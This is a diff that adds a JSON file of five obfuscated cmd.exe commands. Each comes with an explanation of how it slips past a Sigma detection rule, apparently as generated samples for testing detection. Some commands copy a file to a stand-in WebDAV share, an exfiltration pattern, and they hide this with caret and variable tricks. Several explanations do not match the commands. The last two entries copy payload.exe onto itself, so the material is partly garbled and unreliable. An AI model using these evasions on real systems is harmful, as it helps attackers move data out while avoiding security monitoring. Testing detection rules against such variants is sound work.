@@ -1,0 +1,22 @@
+[
+  {
+    "output": "cmd.exe /c t^y^p^e C:\\temp\\data.txt > \\\\webdav.server.local\\share\\data.txt",
+    "explanation": "This command uses insertion (carets to escape characters) and reordering (standard syntax) to bypass the Sigma rule while maintaining the same behavior as the original command."
+  },
+  {
+    "output": "cmd.exe /c set \"cmd=type\" && call %cmd% \\\\webdav.server.local\\share\\file.txt > C:\\temp\\file.txt",
+    "explanation": "This command uses environment variable substitution and call syntax to obfuscate the use of the 'type' command, making it harder for the Sigma rule to detect."
+  },
+  {
+    "output": "cmd.exe /c type C:\\temp\\data.txt >\\\\webdav.server.local\\share\\data.txt",
+    "explanation": "This command uses omission (removing spaces) and reordering to bypass the Sigma rule's atom-based detection while preserving the original behavior."
+  },
+  {
+    "output": "cmd.exe /c t^yp^e payload.exe > payload.exe",
+    "explanation": "This command uses insertion (carets to escape characters) and reordering to bypass the Sigma rule while maintaining the same behavior as the original command."
+  },
+  {
+    "output": "cmd.exe /c type \"payload.exe\" > payload.exe",
+    "explanation": "This command uses insertion (quotes) and reordering to bypass the Sigma rule while maintaining the same behavior as the original command."
+  }
+]
